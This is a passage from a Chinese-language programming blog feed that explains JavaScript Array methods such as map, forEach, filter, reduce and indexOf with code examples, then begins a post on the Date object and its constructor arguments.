<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>[e];</span><br><span class="line">&#125;, arr)</span><br><span class="line"><span class="comment">// [&#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码通过<code>map</code>方法的第二个参数，将回调函数内部的<code>this</code>对象，指向<code>arr</code>数组<br>如果数组有空位，<code>map</code>方法的回调函数在这个位置不会执行，会跳过数组的空位</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123; <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="literal">undefined</span>, <span class="number">2</span>].map(f) <span class="comment">// [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]</span></span><br><span class="line">[<span class="number">1</span>, <span class="literal">null</span>, <span class="number">2</span>].map(f) <span class="comment">// [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]</span></span><br><span class="line">[<span class="number">1</span>, , <span class="number">2</span>].map(f) <span class="comment">// [&quot;a&quot;, , &quot;a&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>map</code>方法不会跳过<code>undefined</code>和<code>null</code>，但是会跳过空位</p>
<h5 id="3-3-11-forEach"><a href="#3-3-11-forEach" class="headerlink" title="3.3.11 forEach()"></a>3.3.11 forEach()</h5><p><code>forEach</code>方法与<code>map</code>方法很相似，也是对数组的所有成员依次执行参数函数。但是，<code>forEach</code>方法不返回值，只用来操作数据。这就是说，如果数组遍历的目的是为了得到返回值，那么使用<code>map</code>方法，否则使用<code>forEach</code>方法。<br><code>forEach</code>的用法与<code>map</code>方法一致，参数是一个函数，该函数同样接受三个参数：当前值、当前位置、整个数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;[&#x27;</span> + index + <span class="string">&#x27;] = &#x27;</span> + element);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>].forEach(log);</span><br><span class="line"><span class="comment">// [0] = 2</span></span><br><span class="line"><span class="comment">// [1] = 5</span></span><br><span class="line"><span class="comment">// [2] = 9</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>forEach</code>遍历数组不是为了得到返回值，而是为了在屏幕输出内容，所以不必使用<code>map</code>方法<br><code>forEach</code>方法也可以接受第二个参数，绑定参数函数的<code>this</code>变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> out = [];</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.push(elem * elem);</span><br><span class="line">&#125;, out);</span><br><span class="line"></span><br><span class="line">out <span class="comment">// [1, 4, 9]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，空数组<code>out</code>是<code>forEach</code>方法的第二个参数，结果，回调函数内部的<code>this</code>关键字就指向<code>out</code>。<br>注意，<code>forEach</code>方法无法中断执行，总是会将所有成员遍历完。如果希望符合某种条件时，就中断遍历，要使用<code>for</code>循环。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr[i] === <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，执行到数组的第二个成员时，就会中断执行。<code>forEach</code>方法做不到这一点<br><code>forEach</code>方法也会跳过数组的空位</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> log = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(n + <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="literal">undefined</span>, <span class="number">2</span>].forEach(log)</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// NaN</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="literal">null</span>, <span class="number">2</span>].forEach(log)</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, , <span class="number">2</span>].forEach(log)</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>forEach</code>方法不会跳过<code>undefined</code>和<code>null</code>，但会跳过空位</p>
<h5 id="3-3-12-filter"><a href="#3-3-12-filter" class="headerlink" title="3.3.12 filter()"></a>3.3.12 filter()</h5><p><code>filter</code>方法用于过滤数组成员，满足条件的成员组成一个新数组返回。<br>它的参数是一个函数，所有数组成员依次执行该函数，返回结果为<code>true</code>的成员组成一个新数组返回。该方法不会改变原数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].filter(<span class="function"><span class="keyword">function</span> (<span class="params">elem</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (elem &gt; <span class="number">3</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// [4, 5]</span></span><br></pre></td></tr></table></figure>
<p>上面代码将大于3的数组成员，作为一个新数组返回。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, <span class="literal">false</span>];</span><br><span class="line"></span><br><span class="line">arr.filter(<span class="built_in">Boolean</span>)</span><br><span class="line"><span class="comment">// [1, &quot;a&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>filter</code>方法返回数组<code>arr</code>里面所有布尔值为<code>true</code>的成员<br><code>filter</code>方法的参数函数可以接受三个参数：当前成员，当前位置和整个数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].filter(<span class="function"><span class="keyword">function</span> (<span class="params">elem, index, arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> index % <span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// [1, 3, 5]</span></span><br></pre></td></tr></table></figure>
<p>上面代码返回偶数位置的成员组成的新数组<br><code>filter</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">MAX</span>: <span class="number">3</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> myFilter = <span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (item &gt; <span class="built_in">this</span>.MAX) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">2</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>];</span><br><span class="line">arr.filter(myFilter, obj) <span class="comment">// [8, 4, 9]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，过滤器<code>myFilter</code>内部有<code>this</code>变量，它可以被<code>filter</code>方法的第二个参数<code>obj</code>绑定，返回大于3的成员</p>
<h5 id="3-3-13-some-，every"><a href="#3-3-13-some-，every" class="headerlink" title="3.3.13 some()，every()"></a>3.3.13 some()，every()</h5><p>这两个方法类似“断言”（assert），返回一个布尔值，表示判断数组成员是否符合某种条件。</p>
<p>它们接受一个函数作为参数，所有数组成员依次执行该函数。该函数接受三个参数：当前成员、当前位置和整个数组，然后返回一个布尔值。</p>
<p><code>some</code>方法是只要一个成员的返回值是<code>true</code>，则整个<code>some</code>方法的返回值就是<code>true</code>，否则返回<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">arr.some(<span class="function"><span class="keyword">function</span> (<span class="params">elem, index, arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> elem &gt;= <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果数组<code>arr</code>有一个成员大于等于3，<code>some</code>方法就返回<code>true</code>。</p>
<p><code>every</code>方法是所有成员的返回值都是<code>true</code>，整个<code>every</code>方法才返回<code>true</code>，否则返回<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">arr.every(<span class="function"><span class="keyword">function</span> (<span class="params">elem, index, arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> elem &gt;= <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，数组<code>arr</code>并非所有成员大于等于3，所以返回<code>false</code>。</p>
<p>注意，对于空数组，<code>some</code>方法返回<code>false</code>，<code>every</code>方法返回<code>true</code>，回调函数都不会执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEven</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> x % <span class="number">2</span> === <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">[].some(isEven) <span class="comment">// false</span></span><br><span class="line">[].every(isEven) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>some</code>和<code>every</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量</p>
<h5 id="3-3-14-reduce-，reduceRight"><a href="#3-3-14-reduce-，reduceRight" class="headerlink" title="3.3.14 reduce()，reduceRight()"></a>3.3.14 reduce()，reduceRight()</h5><p><code>reduce</code>方法和<code>reduceRight</code>方法依次处理数组的每个成员，最终累计为一个值。它们的差别是，<code>reduce</code>是从左到右处理（从第一个成员到最后一个成员），<code>reduceRight</code>则是从右到左（从最后一个成员到第一个成员），其他完全一样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].reduce(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a, b);</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 1 2</span></span><br><span class="line"><span class="comment">// 3 3</span></span><br><span class="line"><span class="comment">// 6 4</span></span><br><span class="line"><span class="comment">// 10 5</span></span><br><span class="line"><span class="comment">//最后结果：15</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>reduce</code>方法求出数组所有成员的和。第一次执行，<code>a</code>是数组的第一个成员<code>1</code>，<code>b</code>是数组的第二个成员<code>2</code>。第二次执行，<code>a</code>为上一轮的返回值<code>3</code>，<code>b</code>为第三个成员<code>3</code>。第三次执行，<code>a</code>为上一轮的返回值<code>6</code>，<code>b</code>为第四个成员<code>4</code>。第四次执行，<code>a</code>为上一轮返回值<code>10</code>，<code>b</code>为第五个成员<code>5</code>。至此所有成员遍历完成，整个方法的返回值就是最后一轮的返回值<code>15</code>。</p>
<p><code>reduce</code>方法和<code>reduceRight</code>方法的第一个参数都是一个函数。该函数接受以下四个参数:</p>
<ol>
<li>累积变量，默认为数组的第一个成员</li>
<li>当前变量，默认为数组的第二个成员</li>
<li>当前位置（从0开始）</li>
<li>原数组</li>
</ol>
<p>这四个参数之中，只有前两个是必须的，后两个则是可选的。</p>
<p>如果要对累积变量指定初值，可以把它放在<code>reduce</code>方法和<code>reduceRight</code>方法的第二个参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].reduce(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// 25</span></span><br></pre></td></tr></table></figure>
<p>上面代码指定参数<code>a</code>的初值为<code>10</code>，所以数组从<code>10</code>开始累加，最终结果为<code>25</code>。注意，这时<code>b</code>是从数组的第一个成员开始遍历。<br>上面的第二个参数相当于设定了默认值，处理空数组时尤其有用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">prev, cur</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> prev + cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[].reduce(add)</span><br><span class="line"><span class="comment">// TypeError: Reduce of empty array with no initial value</span></span><br><span class="line">[].reduce(add, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于空数组取不到初始值，reduce方法会报错。这时，加上第二个参数，就能保证总是会返回一个值。</p>
<p>下面是一个<code>reduceRight</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">subtract</span>(<span class="params">prev, cur</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> prev - cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>].reduce(subtract) <span class="comment">// 0</span></span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>].reduceRight(subtract) <span class="comment">// -4</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>reduce</code>方法相当于<code>3</code>减去<code>2</code>再减去<code>1</code>，<code>reduceRight</code>方法相当于<code>1</code>减去<code>2</code>再减去<code>3</code>。<br>由于这两个方法会遍历数组，所以实际上还可以用来做一些遍历相关的操作。比如，找出字符长度最长的数组成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findLongest</span>(<span class="params">entries</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> entries.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">longest, entry</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> entry.length &gt; longest.length ? entry : longest;</span><br><span class="line">  &#125;, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">findLongest([<span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]) <span class="comment">// &quot;aaa&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>reduce</code>的参数函数会将字符长度较长的那个数组成员，作为累积值。这导致遍历所有成员之后，累积值就是字符长度最长的那个成员。</p>
<h5 id="3-3-15-indexOf-，lastIndexOf"><a href="#3-3-15-indexOf-，lastIndexOf" class="headerlink" title="3.3.15 indexOf()，lastIndexOf()"></a>3.3.15 indexOf()，lastIndexOf()</h5><p><code>indexOf</code>方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回<code>-1</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">a.indexOf(<span class="string">&#x27;b&#x27;</span>) <span class="comment">// 1</span></span><br><span class="line">a.indexOf(<span class="string">&#x27;y&#x27;</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p><code>indexOf</code>方法还可以接受第二个参数，表示搜索的开始位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>].indexOf(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p>上面代码从<code>1</code>号位置开始搜索字符<code>a</code>，结果为<code>-1</code>，表示没有搜索到。<br><code>lastIndexOf</code>方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回<code>-1</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>];</span><br><span class="line">a.lastIndexOf(<span class="number">2</span>) <span class="comment">// 3</span></span><br><span class="line">a.lastIndexOf(<span class="number">7</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p>注意，这两个方法不能用来搜索<code>NaN</code>的位置，即它们无法确定数组成员是否包含<code>NaN</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>) <span class="comment">// -1</span></span><br><span class="line">[<span class="literal">NaN</span>].lastIndexOf(<span class="literal">NaN</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p>这是因为这两个方法内部，使用严格相等运算符（<code>===</code>）进行比较，而<code>NaN</code>是唯一一个不等于自身的值</p>
<h5 id="3-3-16-链式使用"><a href="#3-3-16-链式使用" class="headerlink" title="3.3.16 链式使用"></a>3.3.16 链式使用</h5><p>上面这些数组方法之中，有不少返回的还是数组，所以可以链式使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> users = [</span><br><span class="line">  &#123;<span class="attr">name</span>: <span class="string">&#x27;tom&#x27;</span>, <span class="attr">email</span>: <span class="string">&#x27;tom@example.com&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">name</span>: <span class="string">&#x27;peter&#x27;</span>, <span class="attr">email</span>: <span class="string">&#x27;peter@example.com&#x27;</span>&#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">users</span><br><span class="line">.map(<span class="function"><span class="keyword">function</span> (<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> user.email;</span><br><span class="line">&#125;)</span><br><span class="line">.filter(<span class="function"><span class="keyword">function</span> (<span class="params">email</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="regexp">/^t/</span>.test(email);</span><br><span class="line">&#125;)</span><br><span class="line">.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">email</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(email);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// &quot;tom@example.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，先产生一个所有 Email 地址组成的数组，然后再过滤出以<code>t</code>开头的 Email 地址，最后将它打印出来。</p>
<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-Array对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0023</title>
    <url>/2021/05/15/%E6%89%93%E5%8D%A10023/</url>
    <content><![CDATA[<p><font color=#999d9c>生命好在无意义，才容得下各自赋予意义。假如生命是有意义的，这个意义却不合我的志趣，那才尴尬狼狈。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="9-Date对象"><a href="#9-Date对象" class="headerlink" title="9. Date对象"></a>9. Date对象</h3><p><code>Date</code>对象是 JavaScript 原生的时间库。它以国际标准时间（UTC）1970年1月1日00:00:00作为时间的零点，可以表示的时间范围是前后各1亿天（单位为毫秒）</p>
<h4 id="9-1-普通函数的用法"><a href="#9-1-普通函数的用法" class="headerlink" title="9.1 普通函数的用法"></a>9.1 普通函数的用法</h4><p><code>Date</code>对象可以作为普通函数直接调用，返回一个代表当前时间的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>()</span><br><span class="line"><span class="comment">// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，即使带有参数，<code>Date</code>作为普通函数使用时，返回的还是当前时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>(<span class="number">2000</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码说明，无论有没有参数，直接调用<code>Date</code>总是返回当前时间</p>
<span id="more"></span>
<h4 id="9-2-构造函数的用法"><a href="#9-2-构造函数的用法" class="headerlink" title="9.2 构造函数的用法"></a>9.2 构造函数的用法</h4><p><code>Date</code>还可以当作构造函数使用。对它使用<code>new</code>命令，会返回一个<code>Date</code>对象的实例。如果不加参数，实例代表的就是当前时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br></pre></td></tr></table></figure>
<p><code>Date</code>实例有一个独特的地方。其他对象求值的时候，都是默认调用<code>.valueOf()</code>方法，但是<code>Date</code>实例求值的时候，默认调用的是<code>toString()</code>方法。这导致对Date实例求值，返回的是一个字符串，代表该实例对应的时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">today</span><br><span class="line"><span class="comment">// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">today.toString()</span><br><span class="line"><span class="comment">// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>today</code>是<code>Date</code>的实例，直接求值等同于调用<code>toString</code>方法。<br>作为构造函数时，<code>Date</code>对象可以接受多种格式的参数，返回一个该参数对应的时间实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数为时间零点开始计算的毫秒数</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">1378218728000</span>)</span><br><span class="line"><span class="comment">// Tue Sep 03 2013 22:32:08 GMT+0800 (CST)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数为日期字符串</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;January 6, 2013&#x27;</span>);</span><br><span class="line"><span class="comment">// Sun Jan 06 2013 00:00:00 GMT+0800 (CST)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数为多个整数，</span></span><br><span class="line"><span class="comment">// 代表年、月、日、小时、分钟、秒、毫秒</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>关于<code>Date</code>构造函数的参数，有几点说明。<br>第一点，参数可以是负整数，代表1970年元旦之前的时间</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(-<span class="number">1378218728000</span>)</span><br><span class="line"><span class="comment">// Fri Apr 30 1926 17:27:52 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>第二点，只要是能被<code>Date.parse()</code>方法解析的字符串，都可以当作参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;2013-2-15&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;2013/2/15&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;02/15/2013&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;2013-FEB-15&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;FEB, 15, 2013&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;FEB 15, 2013&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;February, 15, 2013&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;February 15, 2013&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;15 Feb 2013&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;15, February, 2013&#x27;</span>)</span><br><span class="line"><span class="comment">// Fri Feb 15 2013 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>第三，参数为年、月、日等多个整数时，年和月是不能省略的，其他参数都可以省略的。也就是说，这时至少需要两个参数，因为如果只使用“年”这一个参数，<code>Date</code>会将其解释为毫秒数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>)</span><br><span class="line"><span class="comment">// Thu Jan 01 1970 08:00:02 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，2013被解释为毫秒数，而不是年份。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，不管有几个参数，返回的都是2013年1月1日零点。</p>
<p>最后，各个参数的取值范围如下。</p>
<ul>
<li>年：使用四位数年份，比如<code>2000</code>。如果写成两位数或个位数，则加上<code>1900</code>，即<code>10</code>代表<code>1910</code>年。如果是负数，表示公元前。</li>
<li>月：<code>0</code>表示一月，依次类推，<code>11</code>表示<code>12</code>月。</li>
<li>日：<code>1</code>到<code>31</code>。</li>
<li>小时：<code>0</code>到<code>23</code>。</li>
<li>分钟：<code>0</code>到<code>59</code>。</li>
<li>秒：<code>0</code>到<code>59</code></li>
<li>毫秒：<code>0</code>到<code>999</code>。</li>
</ul>
<p>注意，月份从<code>0</code>开始计算，但是，天数从<code>1</code>开始计算。另外，除了日期的默认值为<code>1</code>，小时、分钟、秒钟和毫秒的默认值都是<code>0</code>。</p>
<p>这些参数如果超出了正常范围，会被自动折算。比如，如果月设为<code>15</code>，就折算为下一年的<code>4</code>月。</p>
